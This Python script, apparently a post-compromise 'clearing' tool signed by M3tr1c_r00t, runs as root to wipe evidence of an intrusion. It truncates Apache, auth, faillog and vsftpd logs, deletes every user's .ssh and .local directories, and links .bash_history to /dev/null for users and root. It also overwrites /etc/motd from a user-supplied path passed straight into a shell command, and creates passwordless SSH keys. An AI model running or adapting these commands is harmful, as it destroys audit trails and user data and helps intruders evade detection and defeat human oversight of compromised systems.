#!/usr/bin/env python3
#@Author : M3tr1c_r00t

import os
import sys
import time
import subprocess
from termcolor import colored


banner = """ 
                                                                                                 
      _____    ____             ______          ____  _____   ______    ____   ____      _____   
  ___|\    \  |    |        ___|\     \    ____|\   \|\    \ |\     \  |    | |    | ___|\    \  
 /    /\    \ |    |       |     \     \  /    /\    \\\    \| \     \ |    | |    ||    |\    \ 
|    |  |    ||    |       |     ,_____/||    |  |    |\|    \  \     ||    | |    ||    | |    |
|    |  |____||    |  ____ |     \--'\_|/|    |__|    | |     \  |    ||    | |    ||    |/____/|
|    |   ____ |    | |    ||     /___/|  |    .--.    | |      \ |    ||    | |    ||    ||    ||
|    |  |    ||    | |    ||     \____|\ |    |  |    | |    |\ \|    ||    | |    ||    ||____|/
|\ ___\/    /||____|/____/||____ '     /||____|  |____| |____||\_____/||\___\_|____||____|       
| |   /____/ ||    |     |||    /_____/ ||    |  |    | |    |/ \|   ||| |    |    ||    |       
 \|___|    | /|____|_____|/|____|     | /|____|  |____| |____|   |___|/ \|____|____||____|       
   \( |____|/   \(    )/     \( |_____|/   \(      )/     \(       )/      \(   )/    \(         
    '   )/       '    '       '    )/       '      '       '       '        '   '      '         
        '                          '                                                             v.1.0.1 @M3tr1c_r00t
"""

def check_root():
    if os.getuid() != 0:
        print(colored("Sorry. You need to run this script as root :)","red",attrs=['bold']))
        sys.exit()

apache_logs = ['access.log','access.log.1','error.log','error.log.1','other_vhosts_access.log']
sys_logs = ['auth.log','error.log','faillog','vsftpd.log']
user_logs = ['.bash_history']
user_delete = ['.local','.ssh']

# getting the users home directories and storing them as a list
output = subprocess.check_output("ls /home",shell=True)
users_list = list(output.decode().split())

def clear_apache_logs():
    print(colored("Clearing Apache logs...","red"))
    for i in apache_logs:
        os.system(f"truncate --size 0 /var/log/apache2/{i}")

def clear_sys_logs():
    print(colored("Clearing System Logs...","red"))
    for i in sys_logs:
        os.system(f"truncate --size 0 /var/log/{i}")

def users_clearance():
    for user in users_list:
        for file in user_delete:
            os.system(f"rm -r /home/{user}/{file} > /dev/null 2>&1")
            # redirects both standard output and standard error to the null device

    for files in user_delete:
        print(colored(f"Removed the {files} directories","green"))

def clear_user_logs():
    print(colored("clearing user logs...","green"))
    for logs in user_logs:
        for user in users_list:
            os.system(f"rm -f /home/{user}/{logs} > /dev/null 2>&1")
            # creating a symbolic link ti /dev/null
            os.system(f"ln -s /dev/null /home/{user}/{logs}")
    for logs in user_logs:
        print(colored(f"Deleted {logs} and created a symbolic link to /dev/null","green"))
    
    log_root = input(colored("Do you want to clear root logs?(y/n)\n","red"))
    if log_root == 'y':
        os.system(f"rm -f /root/{logs} > /dev/null 2>&1")
        # creating a symbolic link ti /dev/null
        os.system(f"ln -s /dev/null /root/{logs}")
    elif log_root == 'n':
        pass
    else:
        print(colored("The entered option does not exist :(","green"))

def edit_motd():
    answer = input(colored("Do you want to edit the message of the day?(y/n)\n","red"))
    if answer=='y':
        dir_location = input(colored("Enter the file directory for the motd...\n","green"))
        os.system(f"cat {dir_location} > /etc/motd ")
    elif answer=='n':
        pass
    else:
        print(colored("The entered option does not exist :(","green"))

def add_ssh_keys():
    check = input(colored("Do you want to add ssh-keys to the machine's users?(y/n)\n","red"))
    if check == 'y':
        users_to_add = input(colored("Do you want to add to all users or a specific user?(a/s)\n","red"))
        if users_to_add == 'a':
            for user in users_list:
                print(colored(f"Creating the .ssh directory for {user}...","green"))
                os.system(f"mkdir /home/{user}/.ssh >/dev/null 2>&1")
                time.sleep(1)
                print(colored("Creating the rsa files...","green"))
                os.system(f"ssh-keygen -f /home/{user}/.ssh/id_rsa -N '' ")
        elif users_to_add == 's':
            print(colored(f"Present users are:\n {users_list}","green"))
            user_checking = input(colored("Which user do you want to add ssh file to? \n","red"))
            if user_checking in users_list:
                print(colored(f"Creating the .ssh directory for {user_checking}...","green"))
                os.system(f"mkdir /home/{user_checking}/.ssh >/dev/null 2>&1")
                time.sleep(1)
                print(colored("Creating the rsa files...","green"))
                os.system(f"ssh-keygen -f /home/{user_checking}/.ssh/id_rsa -N '' ")

            else:
                print(colored("The entered user does not exist :(","green"))
    elif check == 'n':
        pass
    else:
        print(colored("The given option does not exist :(","green"))

    check_root = input(colored("Do you want to add ssh-keys to the root user?(y/n)\n","red"))
    if check_root == 'y':
        print(colored(f"Creating the .ssh directory for root...","green"))
        os.system(f"mkdir /root/.ssh >/dev/null 2>&1")
        time.sleep(1)
        print(colored("Creating the rsa files...","green"))
        os.system(f"ssh-keygen -f /root/.ssh/id_rsa -N '' ")
    elif check_root == 'n':
        pass
    else:
        print(colored("The entered option does not exist :(","green"))

def main():
    print(colored(f"{banner}","yellow"))
    check_root()
    time.sleep(1)
    clear_apache_logs()
    time.sleep(1)
    clear_sys_logs()
    time.sleep(1)
    users_clearance()
    time.sleep(1)
    clear_user_logs()
    time.sleep(1)
    edit_motd()
    add_ssh_keys()
try:
    main()
except KeyboardInterrupt:
    print(colored("\n Exiting...\n","yellow"))
#You can use this to make your motd ascii art. Add the art to a file and when you're at the edit_motd() function, give it the file location.
#https://www.asciiart.eu/comics/spiderman
